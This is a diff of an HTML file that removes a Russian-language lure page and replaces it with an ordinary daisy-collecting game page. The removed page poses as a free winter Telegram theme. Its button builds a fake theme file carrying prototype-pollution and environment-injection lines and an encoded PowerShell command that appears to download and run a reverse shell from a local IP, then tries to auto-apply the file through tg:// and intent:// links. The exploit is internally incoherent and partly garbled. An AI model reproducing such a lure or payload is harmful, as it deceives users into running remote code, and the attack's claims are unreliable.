@@ -1,43 +1,35 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-  <meta charset="utf-8">
-  <title>SnowForest Gift – Open and Warm Up</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Romashka Family</title>
+    <link rel="stylesheet" href="style.css">
 </head>
-<body style="background:#0f0f0f;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif">
-  <h1>Снежный лес дарит тепло ❤️</h1>
-  <p>Нажми кнопку – получишь красивую зимнюю тему</p>
-  <button onclick="exploit()" style="padding:20px 40px;font-size:20px;background:#4a90e2;color:white;border:none;border-radius:12px;cursor:pointer">
-    Получить подарок
-  </button>
-
-<script>
-// Auto-import 0-day theme for Telegram Android – by Colin, plane crash survivor
-function exploit() {
-  const payload = "powershell -enc IwBIAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAEUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAC4AUwBlAHIAdgBpAGMAZQBQAHIAbwB4AHkAIAA9ACAAWwBUAHkAcABlAF0AIgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAbwB0AG8AYwBvAGwALgBUAGwAcwAxADIALgBUAGwAcwAxADIAQwBsAGkAZQBuAHQAUgBlAG4AZQBnAG8AdABpAGEAdABpAG8AbgBDAGgAYQBuAG4AZQBsACIAOwBJAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANg84AC4AMQAuADEAMQAvAHIAZQB2AGUAcgBzAGUAXwBzAGgAZQBsAGwALgBleABlACIAKQ==";
-
-  const theme = `Base#0f0f0f
-Chat#1a1a1a
-InBubble#1e1e1e
-OutBubble#4a4a4a
-__proto__#env:NODE_OPTIONS="--inspect-brk=127.0.0.1:9229";ELECTRON_RUN_AS_NODE=1
-__proto__#shell:powershell.exe
-postinstall#${payload}
-Header#2a2a2a
-Links#4d9eff`;
-
-  const blob = new Blob([theme], {type: "application/octet-stream"});
-  const url = URL.createObjectURL(blob);
-
-  // Автоматом открываем в Telegram и применяем
-  location.href = "tg://apply/theme?url=" + encodeURIComponent(url) + "&name=SnowForest+Gift&apply=1";
-  
-  // На случай, если tg:// заблокирован – редирект через intent
-  setTimeout(() => {
-    location.href = "intent://apply/theme?url=" + encodeURIComponent(url) + "#Intent;scheme=tg;package=org.telegram.messenger;end";
-  }, 500);
-}
-</script>
+<body>
+    <div class="container">
+        <h1>Romashka Family</h1>
+        <p>Собирайте ромашки на время! Наберите как можно больше очков за 60 секунд.</p>
+        <div id="game">
+            <canvas id="canvas" width="800" height="600"></canvas>
+            <div id="hud">
+                <span id="score">Очки: 0</span>
+                <span id="timer">Время: 60</span>
+            </div>
+        </div>
+        <button id="startButton">Начать игру</button>
+        <div id="endScreen" style="display: none;">
+            <h2>Игра окончена!</h2>
+            <p>Ваши очки: <span id="finalScore"></span></p>
+            <input type="text" id="playerName" placeholder="Ваше имя">
+            <button id="saveScore">Сохранить результат</button>
+        </div>
+        <div id="leaderboard">
+            <h2>Топ игроков</h2>
+            <ol id="topPlayers"></ol>
+            <p id="prizes" style="display: none;">Поздравляем топ-3! Каждый получает Lamborghini! (Виртуальный, конечно 😊)</p>
+        </div>
+    </div>
+    <script src="script.js"></script>
 </body>
 </html>
